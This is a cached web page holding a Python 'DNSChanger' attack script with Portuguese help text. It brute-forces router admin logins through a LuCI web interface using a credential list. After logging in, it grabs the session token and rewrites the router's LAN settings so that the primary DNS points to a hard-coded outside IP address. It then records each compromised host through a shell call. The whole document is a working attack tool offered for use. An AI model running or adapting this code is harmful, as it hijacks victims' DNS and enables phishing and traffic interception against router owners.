
<!-- saved from url=(0151)http://webcache.googleusercontent.com/search?q=cache:2L8sHdQFu3cJ:goldenkash.com/application/class/routers_py/router.WebUI.py+&cd=1&hl=en&ct=clnk&gl=us -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!--<base href="http://goldenkash.com/application/class/routers_py/router.WebUI.py">--><base href="."><style>body{margin-left:0;margin-right:0;margin-top:0}#bN015htcoyT__google-cache-hdr{background:#f5f5f5;font:13px arial,sans-serif;text-align:left;color:#202020;border:0;margin:0;border-bottom:1px solid #cecece;line-height:16px;padding:16px 28px 24px 28px}#bN015htcoyT__google-cache-hdr *{display:inline;font:inherit;text-align:inherit;color:inherit;line-height:inherit;background:none;border:0;margin:0;padding:0;letter-spacing:0}#bN015htcoyT__google-cache-hdr a{text-decoration:none;color:#1a0dab}#bN015htcoyT__google-cache-hdr a:hover{text-decoration:underline}#bN015htcoyT__google-cache-hdr a:visited{color:#609}#bN015htcoyT__google-cache-hdr div{display:block;margin-top:4px}#bN015htcoyT__google-cache-hdr b{font-weight:bold;display:inline-block;direction:ltr}</style><style>pre{white-space:pre-wrap}</style></head><body><div id="bN015htcoyT__google-cache-hdr"><div><span>This is Google's cache of <a href="http://goldenkash.com/application/class/routers_py/router.WebUI.py">http://goldenkash.com/application/class/routers_py/router.WebUI.py</a>.</span>&nbsp;<span>It is a snapshot of the page as it appeared on Sep 16, 2018 13:42:44 GMT.</span>&nbsp;<span>The <a href="http://goldenkash.com/application/class/routers_py/router.WebUI.py">current page</a> could have changed in the meantime.</span>&nbsp;<a href="http://support.google.com/websearch/bin/answer.py?hl=en&amp;p=cached&amp;answer=1687222"><span>Learn more</span>.</a></div><span style="display:inline-block;margin-top:8px;color:#717171"><span>Tip: To quickly find your search term on this page, press <b>Ctrl+F</b> or <b>⌘-F</b> (Mac) and use the find bar.</span></span></div><div style="position:relative; margin:8px;"><pre>#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse, requests, md5, base64, time, os

from scan import password
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description='Script for DNSChanger by Ghost', prog='Ghost', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=100,width=200))
parser.add_argument("-dns1", "--dns1", help = "Define o dns primário", metavar='', default='192.99.187.193', required=False)
parser.add_argument("-dns2", "--dns2", help = "Define o dns secundário", metavar='', default='8.8.4.4', required=False)
parser.add_argument("-host", "--host", help = "Define o ip e porta do router a ser executado", metavar='', default='a', required=False)

args = parser.parse_args()

dns1 = args.dns1
dns2 = args.dns2
host = args.host.replace("http://","")

router = requests.Session()

header = {
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control':'max-age=0',
    'Connection':'keep-alive',
    'Content-Length':'31',
    'Content-Type':'application/x-www-form-urlencoded',
    'Cookie':'sysauth=',
    'Host':host,
    'Origin':'http://'+host,
    'Referer':'http://'+host+'/cgi-bin/luci',
    'Upgrade-Insecure-Requests':'1',
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
}

for x in password.Credentials:

    users = x.split(":")

    data = {
        'username':users[0],
        'password':users[1],
    }

    try:
        login = router.post("http://"+host+"/cgi-bin/luci", headers=header, data=data)
        if "Router Model" in login.content:

            get_chave = str(login.content).split('&lt;a href="/cgi-bin/luci/;stok=')
            get_chave = get_chave[1].split("/admin")
            chave = get_chave[0]
            break
    except Exception as e:
        print(e)


header = {
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control':'max-age=0',
    'Connection':'keep-alive',
    'Content-Length':'2813',
    'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryU2dCrA2soEtOt4AA',
    'Cookie':'sysauth=8b5843f8037dd9024e7519fbf9f84ec7; sysauth=',
    'Host':host,
    'Origin':'http://'+host,
    'Referer':'http://'+host+'/cgi-bin/luci/;stok='+chave+'/admin/network/lan',
    'Upgrade-Insecure-Requests':'1',
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
}


data = {
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbi.submit"':1,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="tab.network.lan"':'general',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.network.lan.proto"':'static',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.network.lan.ipaddr"':'192.168.1.1',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.network.lan.netmask"':'255.255.255.0',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.network.lan.broadcast"':'',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.network.lan.dns"':dns1,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.network.lan.dns"':dns2,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbi.cbe.network.lan.auto"':1,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.network.lan.auto"':1,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.network.lan.mtu"':'',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.network.lan.metric"':'',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbi.cts.network.alias."':'',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="tab.dhcp.lan"':'general',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbi.cbe.dhcp.lan.ignore"':'1',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.dhcp.lan.start"':100,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.dhcp.lan.limit"':150,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.dhcp.lan.leasetime"':'12h',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbi.cbe.dhcp.lan.dynamicdhcp"':1,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.dhcp.lan.dynamicdhcp"':1,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbi.cbe.dhcp.lan.force"':1,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.dhcp.lan.force"':1,
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.dhcp.lan.netmask"':'',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbid.dhcp.lan.dhcp_option"':'',
    '------WebKitFormBoundaryPhBQ0NSY7Xg6W9Tk Content-Disposition: form-data; name="cbi.apply"':'Save',
}

try:
    changeDNS = router.post("http://"+host+"/cgi-bin/luci/;stok="+chave+"/admin/network/lan", headers=header, data=data)
    print(changeDNS.status_code)
    os.system("cd /var/www/html/logs;php gravar.php "+host)
except Exception as e:
    pass

</pre></div></body></html>